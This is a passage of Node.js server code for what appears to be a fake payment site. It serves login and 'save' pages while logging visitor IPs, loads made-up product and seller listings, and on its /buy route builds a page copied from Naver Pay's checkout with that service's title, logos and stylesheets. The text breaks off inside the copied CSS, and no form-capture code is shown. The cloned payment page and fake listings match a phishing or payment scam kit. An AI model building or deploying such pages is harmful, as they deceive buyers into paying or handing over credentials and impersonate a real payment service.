
const requestIp = require("request-ip");
									
var srequest = require('sync-request');
var test = require('./test.json')
var ison = 1
var email;
var isregister, islogin;
var pw;
var text;
var testgo;
var deviceNAME;
var deviceUUID;
var image,sell,name,id
var 물건이름 = test.물건이름
var 물건이미지 = test.물건이미지
var 판매자이름 = test.판매자이름
var 가격 = test.가격
var 기존가격 = test.기존가격
var 가격1 = test.가격1
var 기존가격1 = test.기존가격1
var axios = require('axios');
var cheerio = require('cheerio');
var request = require('request');
var os = require('os');
var crypto = require('crypto');
var fs = require('fs');
const express = require('express');
const http = require('http');
const app = express();
var url = require('url');
const qs = require('querystring');
const webp=require('webp-converter');
const { parse } = require("path");
const { off } = require("process");
const { time } = require("console");
const { flatten } = require("cheerio/lib/options");
var black_ip_list = {
	'black' : []
}
function getRandomInt(min, max) { 
	return Math.floor(Math.random() * (max - min)) + min;
 }

setInterval(() => {
	checkToken2();
	console.log("[ 정보 ] 토큰이 리로드됨.\n")
 }, 1800000);
 async function checkToken2() {
	token22 = "1";
	console.log("1");
	return "B";
 }
 console.log(checkToken2())
const server = http.createServer(function(req, res){ 

//pass input image(.jpeg,.pnp .....) path ,output image(give path where to save and image file name with .webp extension)
//pass option(read  documentation for options)
//cwebp(input,output,option)

if(req.url.startsWith('/rwebp')) {
var ramdom_topic = ['animals', 'arch', 'nature', 'people', 'tech']
var ram_num = getRandomInt(0,5)
var what_pick = ramdom_topic[ram_num]
console.log(what_pick+'/'+ram_num)
var img_data = (srequest('GET', `http://placeimg.com/1080/2500/${what_pick}`,).getBody())
//console.log(data)
fs.writeFileSync("nodejs_logo.jpg",img_data)
const result = webp.cwebp("nodejs_logo.jpg","nodejs_logo.webp","-q 80",logging="-v");
result.then((response) => {
	response_data = fs.readFileSync('nodejs_logo.webp')
	res.writeHead(200, {'Content-Type': 'image/webp'}); 
	res.end(response_data); 
});



}

	if(req.url == '/11') { // login start
		fs.readFile('./static/html/num.html', function(err, data) { 
			res.writeHead(200, {'Content-Type':'text/html'}); 
			res.end(data); 
		})
		};

	if(req.url == '/login') { // login start
		console.log('[ 정보 ] 로그인창에 접속하였습니다\n\nIP : '+requestIp.getClientIp(req))
		fs.readFile('./static/html/login.html', function(err, data) { 
			res.writeHead(200, {'Content-Type':'text/html'}); 
			res.end(data); 
		}); 
		
	} 

	
	if(req.url == '/save') { // login start
		console.log('[ 정보 ] 세이브창에 접속하였습니다\n\nIP : '+requestIp.getClientIp(req))
		fs.readFile('./static/html/main.html', function(err, data) { 
			res.writeHead(200, {'Content-Type':'text/html'}); 
			res.end(data); 
		}); 
		
	} 
	if(req.url == '/buy') { // login start
		console.log('[ 정보 ] 결제창 접속\n\nIP : '+requestIp.getClientIp(req))
			buy = `<html lang="ko"><head><style type="text/css" id="_jmc_no_tap_highlight_tag_"></style><script async="" type="text/javascript" src="http://ssl.pstatic.net/tveta/libs/ssp/ssp.web.sdk.js"></script>
			<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
			<meta http-equiv="Content-Script-Type" content="text/javascript">
			<meta http-equiv="Content-Style-Type" content="text/css">
			
			<meta name="referrer" contents="always">
			<meta property="og:title" content="네이버페이">
			<meta property="og:image" content="http://img.pay.naver.net/static/images/customer/og/naverpay.png">
			<meta property="og:description" content="네이버 ID로 간편구매, 네이버페이">
			<title>네이버페이</title>
			<link rel="shortcut icon" href="http://ssl.pstatic.net/static.checkout/layout/202202231455/images/customer/favicon.ico">
			<link type="text/css" rel="stylesheet" href="http://ssl.pstatic.net/static.checkout/layout/202202231455/css/customer/chk_n_common.css">
			
			<link type="text/css" rel="stylesheet" href="http://img.pay.naver.net/o/wstatic/css/service/front/order/ordersheet.css?1646914882576">
			<link type="text/css" rel="stylesheet" href="http://img.pay.naver.net/o/wstatic/css/service/front/order/layerpopup.css?1646914882576">
			
			<style id="gnb_style" type="text/css">@charset "UTF-8";
			/* NTS UIT Development Office YJH 140717 */
			a.gnb_my, .gnb_icon, #gnb .gnb_my_interface, .gnb_my_li .gnb_my_content .gnb_membership, #gnb .gnb_my_membership, #gnb .gnb_ico_num .gnb_ico_new, #gnb .gnb_ico_num .gnb_ico_new .gnb_count, .gnb_lst .ico_arrow, a.gnb_my .filter_mask, .gnb_my_lyr, .gnb_my_li .gnb_my_content .gnb_mask, .gnb_my_li .gnb_my_content .gnb_change, .gnb_my_li .gnb_my_content .gnb_edit_lst li, .gnb_my_li .gnb_my_content .gnb_pay_check em, #gnb .gnb_my_li .gnb_my_community a.gnb_pay span, .gnb_notice_li .gnb_notice_lyr, .gnb_notice_li .svc_list .gnb_ico_mail, .gnb_notice_li .svc_list .gnb_btn_remove span, .gnb_notice_li .svc_list .gnb_btn_remove i, .gnb_notice_li .gnb_error .gnb_ico_error, .gnb_ly_alert .gnb_btn_close i, .gnb_first_visit, .gnb_search_box, .gnb_search_box .gnb_del_txt, .gnb_svc_more .gnb_svc_lstwrp li.gnb_event em.ic_gnb_new, .gnb_svc_more .svc_btnwrp button { background: url(http://ssl.pstatic.net/static/common/gnb/one/sp_gnb_v14.png) no-repeat -999px -999px;		background: url(http://ssl.pstatic.net/static/common/gnb/one/sp_gnb_v15.png?v=2006) no-repeat -999px -999px; /* background: url(../img/sp_gnb_v15.png) no-repeat -999px -999px; */}
			.gnb_favorite_area, .gnb_search_area, .gnb_banner, .gnb_linkwrp{background:url(http://ssl.pstatic.net/static/common/gnb/2014/bg_svclyr2_v2.png) no-repeat -999px -999px}
			#gnb .gnb_my_li .gnb_my_community a, .gnb_notice_li .gnb_notice_all, a.gnb_service_all, .gnb_svc_more .svc_btns{display:block;height:38px;border-top:1px solid #ebebeb;background-color:#f8f8f8;text-align:center;font-weight:bold;text-decoration:none;letter-spacing:-1px;line-height:38px}
			#gnb .gnb_my_li .gnb_my_community a:visited, .gnb_notice_li .gnb_notice_all:visited, a.gnb_service_all:visited, .gnb_svc_more .svc_btns:visited{color:#444}
			.gnb_login_li, .gnb_my_li, .gnb_notice_li, .mail_li, .gnb_service_li{float:left;margin-right:2px;overflow:visible}
			.gnb_login_li a, .gnb_my_li a, .gnb_notice_li a, .mail_li a, .gnb_service_li a{position:relative;z-index:100}
			a.gnb_my, .gnb_icon{position:relative}
			#gnb{position:relative;z-index:2147483646;font-family:'나눔고딕',NanumGothic,'돋움',Dotum,'Apple SD Gothic Neo',Helvetica,Sans-serif !important;color:#444;font-size:12px;letter-spacing:0 !important;line-height:normal !important;text-align:left !important}
			#gnb div, #gnb p, #gnb span, #gnb em, #gnb strong, #gnb h1, #gnb h2, #gnb h3, #gnb h4, #gnb h5, #gnb h6, #gnb ul, #gnb ol, #gnb li, #gnb dl, #gnb dt, #gnb dd, #gnb table, #gnb th, #gnb td, #gnb form, #gnb fieldset, #gnb legend, #gnb input, #gnb textarea, #gnb button, #gnb label{font-family:'나눔고딕',NanumGothic,'돋움',Dotum,'Apple SD Gothic Neo',Helvetica,Sans-serif !important}
			#gnb a, #gnb label, #gnb button{cursor:pointer}
			#gnb a, #gnb a:visited, #gnb a:active, #gnb a:focus{color:#444}
			#gnb a:hover{color:#444;text-decoration:underline}
			#gnb input::-ms-clear{display:none}
			#gnb em{font-style:normal}
			#gnb ul{list-style:none}
			#gnb .blind{display:block;overflow:hidden;position:absolute;top:-1000em;left:0;width:1px;height:1px;margin:0;padding:0;font-size:0;line-height:0}
			#gnb .gnb_my_membership{padding: 0;display: block;width: 64px;height: 16px;background-position: -296px -359px;margin: 0;}
			#gnb .gnb_my_interface{padding:5px;position:absolute;top:12px;right:8px;display:block;width:17px;height:16px;background-position:-90px 5px}
			#gnb .gnb_my_interface:hover{background-position:-90px -20px}
			#gnb .gnb_my_interface:focus{background-position:-90px -20px}
			#gnb .gnb_pad_lyr{position:absolute}
			#gnb .gnb_ico_num{display:block;position:absolute;top:1px;width:40px;text-align:center}
			#gnb .gnb_ico_num .gnb_ico_new{height:15px;display:inline-block;background-position:-331px 0;zoom:1}
			#gnb .gnb_ico_num .gnb_ico_new .gnb_count{position:relative;top:0;right:-5px;height:15px;margin:0;padding:0 4px 0 1px;display:inline-block;*display:inline;vertical-align:top;background-position:100% 0;text-indent:-2px;font-family:tahoma !important;font-weight:bold;color:#fff;zoom:1}
			#gnb .gnb_ico_num .gnb_ico_new .plus{margin:1px -1px 0 2px;font-size:8px;display:inline-block;color:#fff;vertical-align:top}
			:root #gnb .gnb_pad_lyr{opacity:1 !important;/* background:#fff */}
			.gnb_lst{margin:0;padding:0;zoom:1}
			.gnb_lst:after{display:block;clear:both;content:''}
			.gnb_lst ul{margin:0;padding:0}
			.gnb_lst .ico_arrow{display:none;position:absolute;left:50%;top:27px;width:10px;height:8px;margin-left:-5px;background-position:-175px -10px}
			.gnb_lyr_opened .gnb_my_lyr, .gnb_lyr_opened .gnb_service_lyr, .gnb_lyr_opened .gnb_notice_lyr, .gnb_lyr_opened .ico_arrow{display:block !important}
			.gnb_login_li{height:23px;padding:5px 7px 0 0}
			.gnb_btn_login, .gnb_bg, .gnb_bdr{display:inline-block;width:46px;height:20px;font-size:12px}
			.gnb_btn_login{position:relative}
			.gnb_bg{background-color: #fff;opacity: 0.05;filter: alpha(opacity=5);}
			.gnb_bdr{position:absolute;top: -1px;left: -1px;width: 46px;height: 20px;border: 1px solid #000;opacity: 0.12;filter: alpha(opacity=12);}
			.gnb_txt{position:absolute;top:0;left:0;width:45px;height:20px;padding-left:1px;line-height:21px;color:#666;text-align:center}
			.gnb_btn_login:hover{text-decoration:none !important}
			.gnb_account .gnb_btn_login{width:54px;margin:-1px 0 0 8px;vertical-align:top}
			.gnb_account a.gnb_btn_login .gnb_txt {padding-left: 0;}
			.gnb_account .gnb_bdr{width:52px}
			.gnb_account .gnb_txt{width:53px}
			.gnb_my_li{margin-right:7px}
			.gnb_my_namebox{padding:2px 9px 0 0;background-repeat:no-repeat;background-position:100% 50%;zoom:1}
			.gnb_my_namebox:after{display:block;clear:both;content:''}
			a.gnb_my{float:left;display:block;font-size:12px;vertical-align:middle}
			a.gnb_my .filter_mask {position: absolute; top: -1px; left: -1px; z-index: 1; width: 28px; height: 28px; background-position: -260px -60px;}
			a.gnb_my img{vertical-align:top;border-radius:16px}
			a.gnb_my .gnb_name{margin-right:-1px;padding-left:5px;display:inline-block;height:28px;line-height:28px;vertical-align:top;font-size:11px;color:#444}
			a.gnb_my:visited{color:#444}
			a.gnb_my:hover, a.gnb_my:active, a.gnb_my:visited, a.gnb_my:focus{text-decoration:none !important}
			a.gnb_my:hover .gnb_name{text-decoration:underline}
			a.gnb_my .ico_arrow{top:25px;margin-left:8px}
			.gnb_my_namebox a.gnb_emp{float:left;display:inline-block;height:28px;margin-left:3px;line-height:28px;font-size:11px;color:#777 !important}
			.gnb_my_lyr{display:none;position:absolute;top:26px;right:-8px;padding:9px 5px 4px 4px;width:316px;height:155px;background-position:-2px -1310px;z-index:10}
			.gnb_my_lyr.gnb_groupid{height:144px;background-position:-2px -1500px}
			.gnb_my_lyr.gnb_groupid .gnb_my_content{height:80px}
			.gnb_my_lyr.gnb_groupid.gnb_longid1{height:144px;/*background-position:-2px -1664px*/}
			.gnb_my_lyr.gnb_groupid.gnb_longid2{height:144px;background-position:-2px -1828px}
			.gnb_my_lyr.gnb_longid1{/*width:318px;*/ /*background-position:-2px -1118px;*/}
			.gnb_my_lyr.gnb_longid2{width:348px;background-position:-2px -926px}
			.gnb_my_li .gnb_my_content{zoom:1;height:91px;padding:15px 0 10px 15px}
			.gnb_my_li .gnb_my_content:after{display:block;clear:both;content:''}
			.gnb_my_li .gnb_my_content .gnb_img_area{float:left;position:relative;display:block;width:80px;margin: 1px 0 0 1px;}
			.gnb_my_li .gnb_my_content .gnb_img_area img{vertical-align:top}
			.gnb_my_li .gnb_my_content .gnb_mask{position:absolute;top:0;left:0;display:block;width:80px;height:80px;background-position:-70px -60px}
			.gnb_my_li .gnb_my_content .gnb_change{position:absolute;bottom:-2px;left:-2px;display:block;width:28px;height:28px;background-position:-140px 0px}
			.gnb_my_li .gnb_my_content .gnb_change:hover{background-position:-140px -30px}
			.gnb_my_li .gnb_my_content .gnb_txt_area{float:left;width:210px;margin:0 0 0 10px}
			.gnb_longid1 .gnb_my_content .gnb_txt_area{/* width:210px; */}
			.gnb_longid2 .gnb_my_content .gnb_txt_area{width:235px}
			.gnb_my_li .gnb_my_content .gnb_account{margin-bottom:3px 0 1px;font-size:0}
			.gnb_my_li .gnb_my_content .gnb_name{color:#666;font-size:14px}
			.gnb_my_li .gnb_my_content .gnb_name a{display:inline-block;vertical-align:top;font-weight:bold;color:#222 !important}
			.gnb_my_li .gnb_my_content a.gnb_mail_address{margin-left:1px;font-family:tahoma;color:#666 !important;font-size:12px}
			.gnb_my_li .gnb_my_content .gnb_edit_lst{zoom:1;margin-top:7px !important}
			.gnb_my_li .gnb_my_content .gnb_edit_lst:after{display:block;clear:both;content:''}
			.gnb_my_li .gnb_my_content .gnb_edit_lst li{float:left;padding-left:6px;margin-left:5px;background-position:-290px -25px}
			.gnb_my_li .gnb_my_content .gnb_edit_lst li.gnb_info{padding-left:0;margin-left:0;background:none}
			.gnb_my_li .gnb_my_content .gnb_edit_lst a{color:#666 !important;letter-spacing:-1px}
			.gnb_my_li .gnb_my_content .gnb_membership {display: inline-block;margin-right: 5px;margin-left: 1px;padding-right: 8px;background-position: -287px -403px;}
			.gnb_my_li .gnb_my_content .gnb_pay_check{height:16px;margin:7px -4px 0 0 !important}
			@media screen and (min-width: 0\0) { .gnb_my_li .gnb_my_content .gnb_pay_check{margin-top:17px} }
			.gnb_my_li .gnb_my_content .gnb_pay_check em{display:inline-block;width:16px;height:16px;background-position:-300px -309px;margin:0 4px 0 0;overflow:hidden;font-size:0;line-height:0;vertical-align:top}
			.gnb_my_li .gnb_my_content .gnb_pay_check a{font-size:14px;letter-spacing:-1px;line-height:16px;vertical-align:top}
			.gnb_my_li .gnb_my_content .gnb_pay_check span{font-weight: bold;}
			.gnb_my_li .gnb_my_content .gnb_pay_check strong{font-family:tahoma;letter-spacing:0;vertical-align:top;}
			.gnb_my_li .gnb_my_content .gnb_pay_check a, .gnb_my_li .gnb_my_content .gnb_pay_check span, .gnb_my_li .gnb_my_content .gnb_pay_check strong{font-size:12px;color:#222 !important}
			#gnb .gnb_my_li .gnb_my_community{clear:both;zoom:1}
			#gnb .gnb_my_li .gnb_my_community:after{display:block;clear:both;content:''}
			#gnb .gnb_my_li .gnb_my_community a{float:left;width:106px;margin-right: 0;border-right:1px solid #ebebeb}
			#gnb .gnb_my_li .gnb_my_community a.gnb_pay{width:102px;border-right:0;line-height:0}
			#gnb .gnb_my_li .gnb_my_community a.gnb_pay span{display:inline-block;width:41px;height:16px;background-position:-300px -334px;margin:11px auto 0;font-size:0;line-height:0}
			#gnb .gnb_my_li .gnb_my_community a:active, #gnb .gnb_my_li .gnb_my_community a:focus, #gnb .gnb_my_li .gnb_my_community a:visited{text-decoration:none !important}
			#gnb .gnb_my_li .gnb_my_community a:hover{text-decoration:underline !important}
			#gnb .gnb_my_lyr.gnb_longid1 .gnb_my_community a{/*width:105px;*/}
			#gnb .gnb_my_lyr.gnb_longid1 .gnb_my_community a.gnb_pay{/* width:106px;*/}
			#gnb .gnb_my_lyr.gnb_longid2 .gnb_my_community a{width:115px}
			#gnb .gnb_my_lyr.gnb_longid2 .gnb_my_community a.gnb_pay{width:116px}
			#gnb.gnb_one .gnb_my_community a, #gnb.gnb_one_small .gnb_my_community a{margin-right: 0 !important;}
			.gnb_notice_li a.gnb_notice{display:block;width:15px;height:17px;padding:7px 9px 4px;text-decoration:none !important}
			.gnb_notice_li a.gnb_notice .gnb_ico_num{left:1px;top:0}
			.gnb_notice_li a.gnb_notice .gnb_icon{display:block;width:15px;height:17px;background-position:-3px -60px}
			.gnb_notice_li a.gnb_notice:hover .gnb_icon{background-position:-38px -60px;text-decoration:none !important}
			.gnb_notice_li .gnb_notice_lyr{display:none;position:absolute;top:26px;right:-7px;width:297px;height:330px;padding:9px 4px 4px;background-position:-2px -584px;z-index:10;overflow:hidden}
			.gnb_notice_li .svc_scroll{height:291px;overflow:scroll;overflow-x:hidden;position:relative;zoom:1}
			.gnb_notice_li .svc_panel{width:100%;height:330px;overflow:hidden}
			.gnb_notice_li .svc_head{position:relative;height:36px;padding-left:15px;line-height:20px;border-bottom:1px solid #eaeaea;zoom:1}
			.gnb_notice_li .svc_head .gnb_tit{color:#6b6d70;margin-right:1px;line-height:36px}
			.gnb_notice_li .svc_head .task_right{position:absolute;right:8px;top:8px;font-size:0}
			.gnb_notice_li .svc_head .task_right button{height:20px;padding:0 6px;margin-left:4px;border:1px solid #ddd;color:#888;background-color:#fff;font-family:'나눔고딕', NanumGothic;font-size:12px;letter-spacing:-1px;line-height:18px;*line-height:16px;overflow:visible}
			.gnb_notice_li .svc_list .gnb_btn_remove i, .gnb_notice_li .svc_list .gnb_btn_remove span, .gnb_notice_li .svc_noti .gnb_ico_mail, .gnb_notice_li .svc_blank .svc_msg_box, .gnb_notice_li .svc_blank .gnb_v_guide{display:inline-block;*display:inline;*zoom:1}
			.gnb_notice_li .svc_list{margin-top:-1px}
			.gnb_notice_li .svc_list li{position:relative;padding:7px 34px 7px 15px;border-top:1px solid #eaeaea;line-height:18px}
			.gnb_notice_li .svc_list .gnb_new{background:#ffffd8}
			.gnb_notice_li .svc_list .gnb_unread .gnb_subject{color:#444}
			.gnb_notice_li .svc_list .gnb_unread .d_cnt{color:#ff630e}
			.gnb_notice_li .svc_list .gnb_unread a:hover .gnb_subject, .gnb_notice_li .svc_list .gnb_unread .gnb_unread a:hover .d_cnt{color:#390}
			.gnb_notice_li .svc_list .gnb_unread .svc_name{color:#444}
			.gnb_notice_li .svc_list a.gnb_list_cover{text-decoration:none !important;display:block;position:relative;zoom:1}
			.gnb_notice_li .svc_list a:hover .gnb_subject{text-decoration:underline}
			.gnb_notice_li .svc_list .gnb_subject{overflow:hidden;text-overflow:ellipsis;white-space:nowrap;width:100%;color:#adadad}
			.gnb_notice_li .svc_list .d_cnt{font-family:tahoma;font-size:10px}
			.gnb_notice_li .svc_list .gnb_info{color:#adadad}
			.gnb_notice_li .svc_list .svc_name{margin-right:3px;color:#adadad}
			.gnb_notice_li .svc_list .cchr{margin-right:3px}
			.gnb_notice_li .svc_list .dona{position:absolute;top:8px;right:34px;text-decoration:underline}
			.gnb_notice_li .svc_list .dona a{color:#adadad}
			.gnb_notice_li .svc_list .dona a:hover{color:#390}
			.gnb_notice_li .svc_list .gnb_ico_mail{width:14px;height:15px;font-size:0;line-height:0;color:#fff;vertical-align:top}
			.gnb_notice_li .svc_list .gnb_ico_mail.gnb_yes{background-position:-245px -17px}
			.gnb_notice_li .svc_list .gnb_ico_mail.gnb_no{background-position:-245px 4px}
			.gnb_notice_li .svc_list .gnb_btn_remove{position:absolute;right:4px;top:50%;z-index:100;margin-top:-13px;padding:10px;line-height:6px;font-size:0;background:none !important;border:0 !important}
			.gnb_notice_li .svc_list .gnb_btn_remove span, .gnb_notice_li .svc_list .gnb_btn_remove i{display:block !important;width:7px;height:7px;font-size:0;line-height:0;color:transparent;white-space:nowrap;overflow:hidden;vertical-align:top;background-position:-175px 0}
			.gnb_notice_li .svc_blank{position:absolute;top:104px;left:0;width:100%;white-space:nowrap;height:100px;font-size:0;text-align:center}
			.gnb_notice_li .svc_blank .svc_msg_box{white-space:normal;font-size:12px;width:100%}
			.gnb_notice_li .svc_blank .gnb_tit{display:block;color:#2f3743;font-size:14px;margin:0 0 15px}
			.gnb_notice_li .svc_blank .gnb_tit strong{font-weight:normal;color:#390}
			.gnb_notice_li .svc_blank .gnb_desc{line-height:19px;color:#2f3743;margin-bottom:7px}
			.gnb_notice_li .svc_blank .gnb_desc a, .gnb_notice_li .svc_blank .gnb_link{color:#390;text-decoration:underline}
			.gnb_notice_li .svc_blank .gnb_v_guide{vertical-align:middle;height:100%;width:0}
			.gnb_notice_li .svc_blank .gnb_link_wrap{text-align:center}
			.gnb_notice_li .svc_blank .gnb_link_wrap .gnb_link{display:block;width:40px;margin:0 auto !important;text-align:center}
			.gnb_notice_li .svc_loading{background:url(http://ssl.pstatic.net/static/www/2014/loading.gif) no-repeat #fff center center;position:absolute;top:33px;left:0;width:100%;height:245px}
			.gnb_notice_li .gnb_error{position:absolute;top:81px;left:2px;width:100%;color:#444;text-align:center}
			.gnb_notice_li .gnb_error .gnb_ico_error{display:inline-block;width:57px;height:57px;background-position:-280px -190px}
			.gnb_notice_li .gnb_error .gnb_tit{font-size:14px;margin:15px 0 11px}
			.gnb_notice_li .gnb_error .gnb_desc{margin-bottom:13px;line-height:18px}
			.gnb_notice_li .gnb_error .gnb_link{text-decoration:underline}
			.gnb_ly_alert{position:absolute;top:110px;left:13px;background-color:#fff;border:1px solid #b7b9bc;width:260px;padding:34px 0 20px;zoom:1;z-index:100}
			.gnb_ly_alert .gnb_msg{text-align:center;line-height:17px;margin-bottom:14px;color:#2f3743}
			.gnb_.ly_alert .gnb_btn_close{position:absolute;right:2px;top:0;*overflow:visible}
			.gnb_ly_alert .gnb_btns{text-align:center}
			.gnb_ly_alert .gnb_btns button{height:27px;line-height:27px;*line-height:22px;font-weight:bold;font-size:12px;padding:0 8px;color:#2f3743;border:1px solid #ddd;background-color:white}
			.gnb_ly_alert .gnb_btns button:first-child{margin-right:4px}
			.gnb_ly_alert .gnb_btn_close{position:absolute;right:2px;top:0;width:35px;border:0;background:none;cursor:pointer;border-radius:0;padding:10px}
			.gnb_ly_alert .gnb_btn_close i{display:block;width:15px;height:15px;font:0/0 a;color:transparent;white-space:nowrap;overflow:hidden;vertical-align:top;background-position:-240px -60px}
			.mail_li a.gnb_mail{display:block;width:20px;height:15px;padding:7px 9px 6px;text-decoration:none !important}
			.mail_li a.gnb_mail .gnb_icon{display:block;width:20px;height:15px;background-position:0px -95px}
			.mail_li a.gnb_mail:hover .gnb_icon{background-position:-35px -95px;text-decoration:none !important}
			.mail_li .gnb_ico_num{left:6px;top:0}
			.gnb_service_li{margin-right:0}
			.gnb_service_li a.gnb_service{display:block;width:16px;height:16px;padding:7px 9px 5px}
			.gnb_service_li a.gnb_service .gnb_icon{display:block;width:16px;height:16px;background-position:-2px -130px}
			.gnb_service_li a.gnb_service:hover .gnb_icon{background-position:-37px -130px;text-decoration:none !important}
			.gnb_service_li .gnb_service_lyr{display:none;position:absolute;top:27px;right:-7px;z-index:10}
			.gnb_favorite_search{width:301px;letter-spacing:-1px}
			.gnb_response .gnb_favorite_search{display:none}
			.gnb_favorite_area{height:93px;padding:8px 4px 0;background-position:0 0}
			.gnb_favorite_lstwrp{position:relative;padding:22px 1px 15px 15px;border-bottom:1px solid #ebebeb}
			.gnb_favorite_lstwrp .gnb_my_interface{top:3px !important;right:3px !important}
			.gnb_first_visit{position:absolute;top:0;left:0;width:293px;height:92px;background-position:0 -310px;z-index:200}
			.gnb_first_visit .gnb_close{position:absolute;top:0;right:0;display:block;width:32px;height:32px}
			.gnb_favorite_lst{zoom:1}
			.gnb_favorite_lst:after{display:block;clear:both;content:''}
			.gnb_favorite_lst li{float:left;width:65px;text-align:center;white-space:nowrap}
			.gnb_favorite_lst a{display:inline-block;text-align:center;font-weight:bold}
			.gnb_favorite_lst .gnb_add a{display:block;test-align:center;}
			.gnb_favorite_lst .gnb_add a span.ic_add{display:block;width:36px;height:36px;margin:0 auto 4px;background-image: url(http://ssl.pstatic.net/static/common/gnb/one/sp_gnb_4b16e6.png);background-position: 0px 0px;background-repeat: no-repeat;width: 36px;height: 36px;vertical-align: top;}
			.gnb_favorite_lst .gnb_add a:hover span.ic_add{background-image: url(http://ssl.pstatic.net/static/common/gnb/one/sp_gnb_4b16e6.png);background-position: -42px 0px;background-repeat: no-repeat;width: 36px;height: 36px;vertical-align: top;}
			.gnb_favorite_lst img{display:block;margin:0 auto 4px;vertical-align:top}
			.gnb_search_area{position:relative;z-index:200;padding:18px 4px 17px;background-position:-301px 0;background-repeat:repeat-y}
			.gnb_search_box{position:relative;z-index:101;margin:0 12px 16px 0;padding-left:10px;display:block;width:270px;height:35px;background-position:10px -190px}
			.gnb_search_box.over{background-position:10px -230px}
			.gnb_search_box.fcs{background-position:10px -270px}
			.gnb_search_box.fcs input{width:200px;font-size:16px;font-weight:bold;color:#444;outline:0}
			.gnb_search_box input{float:left;display:block;width:210px;height:22px;margin-top:6px;padding-left:10px;font-family:'나눔고딕',NamumGothic;letter-spacing:-1px;color:#adadad;font-size:13px;border:0;line-height:22px;background:transparent}
			.gnb_search_box .gnb_del_txt{position:absolute;top:8px;right:32px;display:block;width:17px;height:17px;background-position:-190px 0px}
			.gnb_search_box .gnb_del_txt:hover{background-position:-190px -20px}
			.gnb_search_box .gnb_pop_input{position:absolute;top:34px;left:10px;width:268px;height:170px;*height:172px;border:1px solid #cbc5c5;border-top:0;background:#fff;overflow-x:hidden;overflow-y:scroll;z-index:110}
			.gnb_search_box .gnb_pop_lst{padding:4px 0 2px}
			.gnb_search_box .gnb_pop_lst a{display:block;padding:6px 0 6px 10px;font-weight:bold}
			.gnb_search_box .gnb_pop_lst .on{background-color:#f5f5f5}
			.gnb_search_lstwrp{zoom:1;height:118px;padding-left:12px}
			.gnb_search_lstwrp:after{display:block;clear:both;content:''}
			.gnb_search_lstwrp .gnb_search_lst{float:left;width:69px;border-left:1px solid #eaeaea}
			.gnb_search_lstwrp .gnb_search_lst.gnb_first{width:64px;border:0}
			.gnb_search_lstwrp li{padding:12px 0 0 8px}
			.gnb_search_lstwrp li.gnb_first{font-weight:bold;padding-top:0}
			.gnb_search_lstwrp li a{display:inline-block;vertical-align:top}
			.gnb_banner{height:47px;margin:0;padding:0 18px;background-position:-301px 0;background-repeat:repeat-y}
			.gnb_banner .gnb_service_event{display:inline-block;border-top:1px solid #ebebeb}
			.gnb_linkwrp{padding:0 4px 4px;background-position:-602px 0}
			a.gnb_service_all:hover, a.gnb_service_all:visited, a.gnb_service_all:active, a.gnb_service_all:focus{text-decoration:none}
			.gnb_svc_more{display:none;position:absolute;top:4px;right:303px;width:589px;overflow:hidden;zoom:1;z-index:1000}
			.gnb_svc_more:after{display:block;clear:both;content:''}
			.gnb_response .gnb_svc_more{right:2px}
			.gnb_bg_top{height:6px;background:url(http://ssl.pstatic.net/static/common/gnb/2014/bg_svclyr1_v2.png) no-repeat}
			.gnb_bg_btm{position:relative;height:6px;background:url(http://ssl.pstatic.net/static/common/gnb/2014/bg_svclyr1_v2.png) no-repeat -1282px 0}
			.gnb_svc_more .gnb_svc_hd{position:relative;padding:0 18px 2px 23px;letter-spacing:-1px;background:url(http://ssl.pstatic.net/static/common/gnb/2014/bg_svclyr1_v2.png) repeat-y -641px 0}
			.gnb_svc_more .gnb_svc_hd .gnb_svc_tit{display:block;padding:12px 0 13px;border-bottom:1px solid #ebebeb;font-size:14px;color:#222}
			.gnb_svc_more .gnb_svc_hd .link{position:absolute;top:14px;right:19px;font-size:12px;color:#444}
			.gnb_svc_more .gnb_svc_hd .link a{color:#444 !important;line-height:16px !important}
			.gnb_svc_more .gnb_svc_lstwrp{position:relative;height:283px;overflow:hidden;padding:15px 15px 0 20px;letter-spacing:-1px;background:url(http://ssl.pstatic.net/static/common/gnb/2014/bg_svclyr1_v2.png) repeat-y -641px 0;zoom:1}
			.gnb_svc_more .gnb_svc_lstwrp:after{display:block;clear:both;content:''}
			.gnb_svc_more .gnb_svc_lstwrp li{height:15px;margin-bottom:5px;color:#6b6d70;white-space:nowrap;line-height:15px}
			.gnb_svc_more .gnb_svc_lstwrp li.gnb_event label{color:#444;font-weight:bold}
			.gnb_svc_more .gnb_svc_lstwrp li.gnb_event em.ic_gnb_new{display:inline-block;width:11px;height:11px;background-position:-215px 0px;margin:2px 0 0 4px;font-size:0;line-height:0;vertical-align:top}
			@media screen and (min-width: 0\0) { .gnb_svc_more .gnb_svc_lstwrp li.gnb_event em.ic{margin-top:3px} }
			.gnb_svc_more .gnb_svc_lstwrp .gnb_input_check{width:13px;height:13px;margin:2px 3px 0 3px;padding:0;vertical-align:top;-webkit-appearance:checkbox;}
			.gnb_svc_more .gnb_svc_lstwrp label{vertical-align:0px}
			.gnb_svc_more .gnb_svc_lstwrp .gnb_disabled strong{color:#a8acb0}
			.gnb_svc_more .gnb_svc_lstwrp .gnb_disabled li{color:#cbcbcb}
			.gnb_svc_more .gnb_svc_lst1{float:left;width:328px;height:280px}
			.gnb_svc_more .gnb_svc_lst1 ul{float:left;width:102px;min-height:260px;padding:5px 0 0 10px;border-left:1px solid #eee}
			.gnb_svc_more .gnb_svc_lst1 ul.gnb_first{padding-left:0;border:0}
			.gnb_svc_more .svc_lst2{float:left;position:relative;width:221px;border:1px solid #eee;background:#fbfbfb;zoom:1}
			.gnb_svc_more .svc_lst2:after{display:block;clear:both;content:''}
			.gnb_svc_more .svc_spc{float:left;position:relative;width:100px;min-height:254px;padding:9px 0 0 10px}
			.gnb_svc_more .svc_spc.gnb_first{border-right:1px solid #eee}
			.gnb_svc_more .svc_spc strong{height:20px;color:#2f3743;line-height:16px}
			.gnb_svc_more .svc_spc a:visited{color:#2f3743}
			.gnb_svc_more .svc_spc ul{padding:8px 0}
			.gnb_svc_more .svc_spc li{margin-bottom:0;padding-bottom:5px;color:#848689}
			.gnb_svc_more .svc_stroy{width:89px;margin-top:-5px;padding:12px 0 0;border-top:1px solid #eee}
			.gnb_svc_more .svc_btns{position:relative;height:33px;overflow:hidden;padding-top:5px;line-height:normal}
			.gnb_svc_more .svc_btnwrp{position:relative;*height:39px;background:url(http://ssl.pstatic.net/static/common/gnb/2014/bg_svclyr1_v2.png) repeat-y -641px 0;padding:0 2px 0 4px}
			.gnb_svc_more .svc_btnwrp button{display:inline-block;width:60px;height:25px;border:0;vertical-align:top}
